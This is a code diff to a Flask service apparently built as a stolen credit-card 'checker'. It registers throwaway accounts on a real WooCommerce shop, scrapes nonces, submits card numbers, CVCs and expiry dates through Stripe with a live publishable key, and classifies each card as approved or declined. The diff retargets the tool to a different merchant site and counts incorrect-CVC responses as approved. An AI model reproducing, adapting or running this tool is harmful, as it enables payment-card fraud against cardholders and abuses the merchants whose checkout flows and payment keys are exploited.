@@ -12,7 +12,7 @@ app = Flask(__name__)
 def full_stripe_check(cc, mm, yy, cvv):
     session = requests.Session()
     session.headers.update({
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
     })
 
     if len(yy) == 4:
@@ -20,7 +20,7 @@ def full_stripe_check(cc, mm, yy, cvv):
 
     try:
         # Step 1 & 2: Get login nonce
-        login_page_res = session.get('https://shop.wiseacrebrew.com/account/')
+        login_page_res = session.get('https://fionademark.com.au/my-account/')
         login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
         if not login_nonce_match:
             return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
@@ -30,26 +30,22 @@ def full_stripe_check(cc, mm, yy, cvv):
         random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
         register_data = {
             'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce,
-            '_wp_http_referer': '/account/', 'register': 'Register',
+            '_wp_http_referer': '/my-account/', 'register': 'Register',
         }
-        session.post('https://shop.wiseacrebrew.com/account/', data=register_data)
+        session.post('https://fionademark.com.au/my-account/', data=register_data)
 
         # Step 4: Get payment nonce with the valid session
-        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/')
+        payment_page_res = session.get('https://fionademark.com.au/my-account/add-payment-method/')
         payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
         if not payment_nonce_match:
             return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
         ajax_nonce = payment_nonce_match.group(1)
 
         # Step 5: Get Stripe payment token
-        stripe_data = {
-            'type': 'card',
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_year]': yy,
-            'card[exp_month]': mm,
-            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
-        }
+        stripe_data = (
+            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
+            '&key=pk_live_51PIMtvHHCyMK11qvc5CeriN2AcT5CJmlRUoaxXPc7ssoFCnt4OUVBqBtSwK4bL091Kq1hYkVZnngesinZd3u0Las00hcFCb4ZD'
+        )
         stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
         if stripe_response.status_code == 402:
             error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
@@ -63,22 +59,29 @@ def full_stripe_check(cc, mm, yy, cvv):
             'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
             'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
         }
-        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
+        final_response = session.post('https://fionademark.com.au/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
         response_json = final_response.json()
 
         if "Unable to verify your request" in response_json.get('messages', ''):
              return {"status": "Declined", "response": "Unable to verify request.", "decline_type": "process_error"}
+        
         if response_json.get('success') is False or response_json.get('status') == 'error':
             error_message = (response_json.get('data', {}).get('error', {}).get('message') or
                              re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
             return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
+        
         if response_json.get('status') == 'succeeded':
             return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
+
+        elif response_json.get('status') == "Your card's security code is incorrect.":
+            return {"status": "Approved", "response": "Incorrect CVC", "decline_type": "none"}
+      
         else:
             return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}
 
     except Exception as e:
         return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}
+
 
 def get_bin_info(bin_number):
     try:
@@ -117,4 +120,4 @@ def check_card_endpoint():
     return jsonify(final_result)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    app.run(host='0.0.0.0', port=4040)
